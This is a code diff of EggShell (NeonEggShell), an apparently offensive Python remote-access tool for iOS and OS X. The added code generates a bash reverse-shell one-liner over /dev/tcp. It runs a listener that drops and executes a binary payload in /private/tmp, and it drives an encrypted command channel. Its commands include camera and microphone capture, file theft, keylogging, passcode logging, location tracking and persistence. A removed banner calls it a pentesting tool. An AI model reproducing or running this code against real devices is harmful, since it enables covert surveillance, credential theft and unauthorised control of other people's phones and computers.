-		print " dial        - dial phone number"
-		print " undisabled  - remove disabled device state after failed passcode attempts"
-		print " locationon  - turn on location services"
-		print " locationoff - turn off location services"
-		print " keylogger   - log keystrokes and passwords on the springboard and sandboxed apps "
-		print "\n " + WHITEBU + "Addons"+WHITE+" (Use \"install\")\n"
-		print " persistence - device will try to connect after session is closed, even after a reboot"
-		print " nespro      - install whole new set of commands"
-	print "\n " + WHITEBU + "Local Commands\n" + WHITE
-	print " clear       - clears the console"
-	print " lls         - perform a local directory listing"
-	print " lcd         - perform a local directory change"
-	print " lpwd        - show current directory"
-	print " lopen       - locally run the command open"
-	print " exit        - cleans up and exits eggshell\n"
+        decrypted = cipher.decrypt(base64.b64decode(encodedEncrypted))[:BS]
 
+        for i in range(1, len(base64.b64decode(encodedEncrypted)) / BS):
+            cipher = AES.new(self.key, AES.MODE_CBC,
+                             base64.b64decode(encodedEncrypted)[(i - 1) * BS:i * BS])
+            decrypted += cipher.decrypt(base64.b64decode(encodedEncrypted)[i * BS:])[:BS]
+
+        return self.pkcs7.decode(decrypted)
+
+    def encode(self, raw, BS=16):
+        if self.key is None:
+            raise ValueError("key is required")
+                    
+        BS = (self.BS if self.BS else BS)
+                        
+        cipher = AES.new(self.key)
+        encoded = self.pkcs7.encode(raw)
+        encrypted = cipher.encrypt(encoded)
+                                    
+        return base64.b64encode(encrypted)
+
+#TODO: should really take out whitespace eventually
+def encryptStr(string,key=shellKey):
+    aesx = AESEncryption(key,16)
+    length = len(string)
+    result = ""
+    x = 0
+    while x < length:
+        chunk = string[x:x+12]
+        result += aesx.encode(chunk)
+        x+=12
+    return result
+
+
+#MARK: String Formatting/Convenience
 def strinfo(this):
-	print INFO+"[*]  " + WHITE + this
+    return COLOR_INFO+"[*]  " + WHITE + this
 
-#show about screen
-def about():
-	os.system("clear")
-	print INFO+"""   .--.  ,---.    .---.  .-. .-. _______ 
- / /\ \ | .-.\  / .-. ) | | | ||__   __|
-/ /__\ \| |-' \ | | |(_)| | | |  )| |   
-|  __  || |--. \| | | | | | | | (_) |   
-| |  |)|| |`-' /\ `-' / | `-')|   | |   
-|_|  (_)/( `--'  )---'  `---(_)   `-'   
-       (__)     (_)                     
-		"""
-	print RED + "Created by NeonEggplant" + WHITE +\
-	"""
-NES is an iOS and OSX command shell creation tool written in python
-This tool creates an command line session with extra functionality like
-downloading files, taking pictures, and gathering  data  on  a  target.  
-To run neoneggshell, first create a payload (shellscript or deb  file).
-The payload should then be executed on the target device that you  want
-to control. 
+def bben(data):
+    return base64.b64encode(data)
 
-This tool is for pentesting only, not for controlling peoples devices"""+RED+"""
+def bbde(data):
+    return base64.b64decode(data)
 
-    [Target]                    """+INFO+"--->                  """+GREEN+"[NES Server(you)]"+WHITE+"""
-  runs payload       """+INFO+"payload points to server ip"+WHITE+"""     listens for target
-execute commands              """+INFO+" <---"+WHITE+"""                     send commands\n
-		"""
-	raw_input(INFO+"PRESS ENTER TO RETURN TO MENU"+ENDC)
-  	mainmenu(1)
+#MARK: Interactive EggShell
+
+#local commands
+
+def showLocalHelp():
+    print WHITEBU+"Local Commands:"+"\n"+ENDC
+    showCommand("lls","list contents of local directory")
+    showCommand("lcd","change local directories")
+    showCommand("lpwd","get current local directory")
+    showCommand("lopen","open local directory")
+    showCommand("clear","clears terminal")
+    print ""
+
+def showCommand(cmd,desc):
+    print cmd + " " * (15 - len(cmd)) + ": " + desc
+
+def showHelp(CDA):
+    if "i386" in CDA:
+        showLocalHelp()
+        print WHITEBU+"OS X Commands:"+"\n"+ENDC
+        showCommand("ls","list contents of directory")
+        showCommand("cd","change directories")
+        showCommand("rm","delete file")
+        showCommand("pwd","get current directory")
+        showCommand("download","download file")
+        showCommand("picture","take picture through iSight camera")
+        showCommand("getpid","get process id")
+        showCommand("openurl","open url through the default browser")
+        showCommand("idletime","get the amount of time since the keyboard/cursor were touched")
+        showCommand("getpaste","get pasteboard contents")
+        showCommand("mic","record microphone")
+        showCommand("brightness","adjust screen brightness")
+        showCommand("exec","execute command")
+        showCommand("persistence","attempts to connect back every 60 seconds")
+        showCommand("rmpersistence","removes persistence")
+        print ""
+    if "arm" in CDA:
+        showLocalHelp()
+        print WHITEBU+"iOS Commands:"+"\n"+ENDC
+        showCommand("ls","list contents of directory")
+        showCommand("cd","change directories")
+        showCommand("rm","delete file")
+        showCommand("pwd","get current directory")
+        showCommand("download","download file")
+        showCommand("frontcam","take picture through front camera")
+        showCommand("backcam","take picture through back camera")
+        showCommand("getpid","get process id")
+        showCommand("vibrate","make device vibrate")
+        showCommand("alert","make alert show up on device")
+        showCommand("say","make device speak")
+        showCommand("locate","get device location")
+        showCommand("respring","respring device")
+        showCommand("setvol","set mediaplayer volume")
+        showCommand("getvol","view mediaplayer volume")
+        showCommand("isplaying","view mediaplayer info")
+        showCommand("openurl","open url on device")
+        showCommand("installpro","installs eggshellpro to device")
+        print "\n"+WHITEBU+"eggshellPro Commands:"+"\n"+ENDC
+        showCommand("lock","simulate lock button press")
+        showCommand("wake","wake device from sleeping state")
+        showCommand("home","simulate home button press")
+        showCommand("doublehome","simulate home button double press")
+        showCommand("play","plays music")
+        showCommand("pause","pause music")
+        showCommand("next","next track")
+        showCommand("prev","previous track")
+        showCommand("getpasscode","log successfull passcode attempts")
+        showCommand("unlock","unlock with passcode") #there are ways to get around this, (alwaysunlock) tweak
+        showCommand("keylog","log keystrokes") #not working inside apps...yet
+        showCommand("keylogclear","clear keylog data")
+        showCommand("locationservice","turn on or off location services")
+        print ""
+
+def lopen(command):
+    if len(command.split()) == 1:
+        print "Usage: lopen localdirectory"
+    else:
+        os.system('open ' + command.replace("lopen ",""))
+
+def lls(command):
+    if len(command.split()) == 1:
+        os.system('ls')
+    else:
+        os.system('ls ' + command.replace("lls ",""))
+
+def lcd(command):
+    if len(command.split()) == 1:
+        print "Usage: lcd localdirectory"
+    else:
+        try:
+            os.chdir(command.split()[1])
+        except:
+            print strinfo("directory not found")
+
+def lpwd():
+    os.system('pwd')
 
 
-def showagreement():
-	print GREEN+"""\
-Copyright 2015, NeonEggShell (NES) by NeonEggplant
-All rights reserved.
-"""+WHITE+"""
-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-"""+RED+"""
-NeonEggShell is created for lawful purposes only. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By choosing yes, you agree to the terms of service and that you will only use this tool for lawful purposes only.
-"""
+#MARK: Interactive Shell
 
-#Start NES
-if sys.version_info < (2, 7):
-		raise "python >= 2.7 is required"
-		
+def initSHELL(name,conn,host,port,CDA):
+    while 1:
+        command = raw_input(name) #raw
+        args = command.split() #split
 
-if not os.path.exists("/usr/local/share/NES/agree"):
-	os.system("clear")
-	
-	if not os.path.exists("/usr/local/share/NES/agree"):
-		if not os.path.exists("/usr/local/share/NES/"):
-			os.makedirs("/usr/local/share/NES/")
-		showagreement()
-		if raw_input(WHITE+"Do you accept [y/n]:"+ENDC) == "y":
-			os.system("touch /usr/local/share/NES/agree")
-		else:
-			exit()
+        try: #fixed crash if you type " "
+            v = args[0]
+        except:
+            continue
+    
+        if not command:
+            continue
+        
+        #exclusive commands
+        if "arm" in CDA:
+            if args[0] == "alert":
+                title = bben(raw_input("Set title: "))
+                message = bben(raw_input("Set message: "))
+                sendCMD(args[0] + " " + title + " " + message,conn)
+                continue
+        elif "i386" in CDA:
+            if args[0] == "mic" and len(args) >= 2 and args[1] == "stop":
+                conn.send(encryptStr(command))
+                downloadFile(command,conn)
+                continue
 
-mainmenu(1)
+        if args[0] == "download" or args[0] == "picture" or args[0] == "frontcam" or args[0] == "backcam" or args[0] == "screenshot":
+            downloadFile(command,conn)
+        elif args[0] == "installpro":
+            uploadFile(nesProDylib,"/Library/MobileSubstrate/DynamicLibraries/nespro.dylib",conn)
+        elif args[0] == "help":
+            showHelp(CDA)
+        elif args[0] == "clear":
+            os.system('clear');
+        elif args[0] == "lopen":
+            lopen(command)
+            continue
+        elif args[0] == "lls":
+            lls(command)
+            continue
+        elif args[0] == "lcd":
+            lcd(command)
+            continue
+        elif args[0] == "lpwd":
+            lpwd()
+            continue
+        elif args[0] == "alert":
+            title = bben(raw_input("Set title: "))
+            message = bben(raw_input("Set message: "))
+            sendCMD(args[0] + " " + title + " " + message,conn)
+        elif args[0] == "back" and len(sessions) > 0:
+            return
+        elif args[0] == "exit":
+            return -1
+        else:
+            sendCMD(command,conn)
+
+def sendCMD(cmd,conn):
+    conn.send(encryptStr(cmd))
+    try:
+        data = receiveString(conn)
+        if data != "":
+            print data
+    except:
+        print receiveString(conn)
+        print "connection was reset"
+        conn.close()
+        exit()
+
+def receiveString(conn):
+#    try:
+        aesx = AESEncryption(shellKey,16)
+        data = ""
+        while 1:
+            data += conn.recv(2048)
+            if not data:
+                return "we fucked up"
+            #terminator to notify when we are done receiving data
+            #useful for getting however much data we want
+            if TERM in data:
+                data = data.replace(TERM,"")
+                result = bbde(aesx.decode(data))
+                if result == "-1":
+                    result = "invalid command"
+                return result
+#    except:
+#        return "error getting return value"
+
+
+#MARK: File Transfers
+def uploadFile(fileName,location,conn):
+    #filedata
+    f = open(fileName,"r")
+    fileData = bben(f.read())
+    f.close()
+    
+    #size
+    print "File size = " + str(sys.getsizeof(fileData))
+    #send cmd
+    print "Installing dylib..."
+    conn.send(encryptStr("installpro"))
+    
+    #send dylib
+    length = len(fileData)
+    result = ""
+    x = 0
+    chunkSize = 512
+    while x < length:
+        chunk = fileData[x:x+chunkSize]
+        sendCMD(chunk,conn)
+        x+=chunkSize
+
+    sendCMD(TERM,conn)
+    #get result
+    print "Finished"
+
+
+def downloadFile(command,conn):
+    #send download command
+    conn.send(encryptStr(command))
+    args = command.split()
+    
+    #receive file size
+    try:
+        sizeofFile = int(receiveString(conn))
+    except:
+        print "oops, couldnt get file size"
+        return
+    if sizeofFile == -1:
+        print "file does not exist"
+        return
+    elif sizeofFile == -2:
+        print "thats a directory"
+        return
+    elif sizeofFile == -3:
+        print "error taking photo :/"
+        return
+    print strinfo("file size: "+str(sizeofFile))
+
+    #filename to write to
+    filename = ""
+    dateFormat = "%Y%m%d%H%M%S"
+    if args[0] == "screenshot":
+        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
+    elif args[0] == "picture":
+        filename = "isight"+time.strftime(dateFormat)+".jpeg"
+    elif args[0] == "frontcam":
+        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
+    elif args[0] == "backcam":
+        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
+    elif args[0] == "mic":
+        filename = "mic"+time.strftime(dateFormat)+".aac"
+    else:
+        filename = command[9:]
+
+    progress = 0
+    file = open(homeDir+".tmpfile", "a+b")
+    #read stream into file
+    while 1:
+        #TODO: there is a small chance EOF will be miss-aligned, need to fix this
+        chunk = conn.recv(1024)
+        progress += len(chunk)
+        #Show progress
+        if progress > sizeofFile:
+            progress = sizeofFile
+        sys.stdout.write("\r"+strinfo(WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
+        #write to file
+        if TERM in chunk:
+            print ""
+            #replace our endoffile keyword
+            chunk = chunk.replace(TERM,"")
+            #write the remaining chunk
+            file.write(chunk)
+            file.close()
+            #decrypt with our shell key, remove tmp file
+            downloadedFile = open(filename,"wb")
+            downloadedFile.close()
+            decryptFile(homeDir+".tmpfile",filename,shellKey,sizeofFile)
+            os.remove(homeDir+".tmpfile")
+            print strinfo("Finished Downloading!")
+            return
+        else:
+            file.write(chunk)
+
+#MARK: Server Functions
+
+def getip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
+        return host
+    except:
+        return "127.0.0.1"
+
+def singleServer(host,port):
+    session = SessionHandler()
+    session.listen(1,host,port)
+    if initSHELL(session.name,session.conn,session.host,session.port,session.CDA) == -1:
+        print strinfo("closing connection")
+        session.conn.close
+        time.sleep(0.5)
+
+def promptHostPort():
+    lhost = getip()
+    lport = 4444
+    hostChoice = raw_input("SET LHOST (Leave blank for "+lhost+")>")
+    if hostChoice != "":
+        lhost = hostChoice
+    print strinfo("LHOST = " + lhost)
+    portChoice = raw_input("SET LPORT (Leave blank for "+str(lport)+")>")
+    if portChoice != "":
+        lport = portChoice
+    print strinfo("LPORT = " + str(lport))
+    return [lhost,lport]
+
+def promptServerRun(host,port):
+    if raw_input(NES+"Start Server? (Y/n): ") == "n":
+        return
+    else:
+        if raw_input(NES+"Multi Server? (y/N): ") == "y":
+            bgserver = Thread(target = multiServer, args=(host,port))
+            bgserver.daemon=True
+            bgserver.start()
+            time.sleep(0.01)
+            multiServerController(port,bgserver)
+            bgserver.join()
+        else:
+            singleServer(host,port)
+
+#MARK: Menu Functions
+
+def menuStartServer(): #1
+    sp = promptHostPort()
+    singleServer(sp[0],sp[1])
+
+def menuStartMultiServer(): #2
+    sp = promptHostPort()
+    bgserver = Thread(target = multiServer, args=(sp[0],sp[1]))
+    bgserver.daemon=True
+    bgserver.start()
+    time.sleep(0.01)
+    multiServerController(sp[1],bgserver)
+    bgserver.join()
+
+def menuCreateScript(): #3
+    sp = promptHostPort()
+    print COLOR_INFO+"bash &> /dev/tcp/"+sp[0]+"/"+str(sp[1])+" 0>&1"+ENDC
+    promptServerRun(sp[0],sp[1])
+
+def menuExit(): #4
+    exit()
+
+
+#MARK: MultiServer
+class SessionHandler:
+    def __init__(self):
+        self.name = ""
+        self.conn = ""
+        self.s = ""
+        self.host = ""
+        self.port = ""
+        self.CDA = ""
+    
+    def listen(self,verbose,host,port):
+        self.host = host
+        self.port = port
+        INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
+        INSTRUCT_BINARY_ARGUMENT = bben(encryptStr(str(host)+" "+str(port)+" "+shellKey,binaryKey))
+        INSTRUCT_STAGER = "uname -p\n"
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('0.0.0.0', int(port)))
+        s.listen(1)
+        if verbose:
+            print strinfo("Listening on port "+str(port)+"...")
+        
+        #debugging
+        if debug:
+            conn, addr = s.accept()
+            data = receiveString(conn)
+            if data: #payload should return the name of the device and we will use that as our prompt
+                name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
+                #spawn our interactive shell
+                self.name = name
+                self.conn = conn
+                CDA = "i386"
+                s.close()
+                return [name,conn,host,port,CDA]
+        
+        #SEND/RECEIVE ARCH
+        conn, addr = s.accept()
+        hostAddress = addr[0]
+        if verbose:
+            print strinfo("Connecting to "+hostAddress)
+        conn.send(INSTRUCT_STAGER)
+        CDA = conn.recv(128)
+
+        #CHOOSE/SEND BINARY
+        payload = ""
+        preload = ""
+    
+        if "i386" in CDA:
+            if verbose:
+                print strinfo("Detected OSX")
+            binaryFile = open(OSX_BINARY, "rb")
+            payload = binaryFile.read()
+            binaryFile.close()
+            preload = "rm /private/tmp/espl;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+        elif "arm" in CDA:
+            if verbose:
+                print strinfo("Detected iOS")
+            binaryFile = open(iOS_BINARY, "rb")
+            payload = binaryFile.read()
+            binaryFile.close()
+            preload = "rm /private/var/tmp/espl;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+        else:
+            if verbose:
+                print strinfo("device unrecognized")
+                print CDA
+            conn.close();
+            return
+        
+        if verbose:
+            print strinfo("Waiting For Target...")
+            print strinfo("Sending Payload")
+        conn.send(preload)
+        conn.send(payload)
+        conn.close() #only one blink!
+    
+        if verbose:
+            print strinfo("Waiting For Connection...")
+        conn, hostAddress = s.accept()
+        data = receiveString(conn)
+
+        if data: #payload should return the name of the device and we will use that as our prompt
+            name = UNDERLINE_GREEN + data.replace("\n","")+ENDC+GREEN+"> "+ENDC;
+            #spawn our interactive shell
+            self.name = name
+            self.conn = conn
+            self.CDA = CDA
+            s.close()
+            return [name,conn,host,port,CDA]
+
+def multiServer(host,port):
+    global eggsessions
+    x = 1
+    strinfo("Starting Background Multi Server on "+str(port)+"...")
+    print "type \"help\" for MultiServer commands"
+    while 1:
+        sessions[x] = SessionHandler()
+        sessions[x].listen(0,host,port)
+        sys.stdout.write("\n\r"+COLOR_INFO+"[*]  " + WHITE+"Session "+str(x)+" opened | "+sessions[x].name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + sessions[x].conn.getpeername()[0] +
+                         WHITE+"\n"+COLOR_INFO+"MultiSession"+WHITE+"> ")
+        sys.stdout.flush()
+        x += 1
+
+def multiServerSessionInteract(args):
+    if len(args) == 2:
+        try:
+            s = sessions[int(args[1])]
+            if initSHELL(s.name,s.conn,s.host,s.port,s.CDA) == -1:
+                multiServerSessionClose(args)
+        except:
+            print strinfo("Session not found")
+
+def multiServerSessionClose(args):
+    if len(args) == 2:
+        x = int(args[1])
+        try:
+            s = sessions[x]
+            s.conn.close()
+            del sessions[x]
+            print strinfo("Session closed")
+        except:
+            print strinfo("Session not found")
+
+def multiServerListSessions():
+    for key,value in sessions.iteritems():
+        if value.name:
+            print "Session [" + str(key) + "] | " + value.name.replace(UNDERLINE_GREEN,"").replace(GREEN,"")[:-10] + " " + value.conn.getpeername()[0]
+
+#TODO: finish this function lol
+def multiServerExit(bgserver):
+    for key,value in sessions.iteritems():
+        if value.name:
+            try:
+                s = sessions[key]
+                s.conn.close()
+            except:
+                pass
+    sessions.clear()
+    bgserver.exit()
+
+
+def multiServerHelp():
+    print WHITEBU+"MultiSession Commands:"+"\n"+ENDC
+    showCommand("interact","interact with session, Usage: interact (session number)")
+    showCommand("close","close session, Usage: close (session number)")
+    showCommand("sessions","list current active sessions")
+    showCommand("back","go back to MultiSession menu from session")
+    print ""
+
+def multiServerController(port,bgserver):
+    while 1:
+        input = raw_input(WHITE+""+COLOR_INFO+"MultiSession"+WHITE+"> ")
+        if not input:
+            continue
+        cmd = input.split()
+
+        #commands
+        if cmd[0] == "interact":
+            multiServerSessionInteract(cmd)
+        elif cmd[0] == "sessions":
+            multiServerListSessions()
+        elif cmd[0] == "close":
+            multiServerSessionClose(cmd)
+        elif cmd[0] == "help":
+            multiServerHelp()
+        elif cmd[0] == "exit":
+            multiServerExit(bgserver)
+            break
+        else:
+            print "invalid command"
+    interactiveMenu()
+
+
+#MARK: Main Menu functions
+
+def interactiveMenu():
+    ERROR = ""
+    while 1:
+        os.system('clear')
+        option = raw_input(ERROR+MENU)
+        choose = {
+            "1" : menuStartServer,
+            "2" : menuStartMultiServer,
+            "3" : menuCreateScript,
+            "4" : menuExit
+        }
+        try:
+            choose[option]()
+            os.system('clear')
+        except KeyError:
+            ERROR = ""
+            if option != '':
+                ERROR = "invalid option\n"
+
+def main():
+    interactiveMenu()
+
+if __name__=="__main__":
+    main()
